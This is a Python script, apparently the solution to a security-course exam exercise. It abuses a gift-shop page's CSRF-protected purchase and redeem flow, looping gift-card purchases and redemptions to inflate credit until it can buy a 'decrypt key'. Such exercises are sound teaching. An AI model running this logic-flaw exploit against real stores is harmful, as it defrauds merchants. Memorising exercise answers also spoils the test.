# Script used for exam simulation exercise

import requests
from lxml import html


session = requests.session()
URL = "https://cod.alviano.org/eshop/gift/"


def get_csrf():
    response = session.get(URL)
    tree = html.fromstring(response.content)
    
    found = tree.xpath(f"//input[@name = 'csrfmiddlewaretoken']/@value")
    return found[0] if len(found) > 0 else None


def get_credit():
    response = session.get(URL)
    tree = html.fromstring(response.content)

    credit = tree.xpath("//div[@class='card-footer']/text()")[0].strip().split("\n")[0][-2:]
    print("current credit: ", credit)
    return credit


def buy_product(product):
    token = get_csrf()
    response = session.post(URL,
        data={
            'csrfmiddlewaretoken': token,
            'product': product,
        },
        headers={
            'referer': URL,
        },
    )


def get_gift_card():
    response = session.get(URL)
    tree = html.fromstring(response.content)
    key = tree.xpath("//div[@class='card-footer']/ul/li/text()")[0].strip()
    return key


def redeem_gift_card(code):
    token = get_csrf()
    response = session.post(URL,
        data={
            'csrfmiddlewaretoken': token,
            'redeem': code,
        },
        headers={
            'referer': URL, 
        },
    )

def get_decrypt_key():
    response = session.get(URL)
    tree = html.fromstring(response.content)
    key = tree.xpath(f"//div[@class='card-footer']/p/text()")[0].strip() # or //div/p/text()
    return key


while True:
    if int(get_credit()) > 50:
        break
    
    buy_product('gift-card-5-euro')
    code = get_gift_card()
    redeem_gift_card(code)

buy_product('decrypt-key')
print(f"Decrypt key: {get_decrypt_key()}")
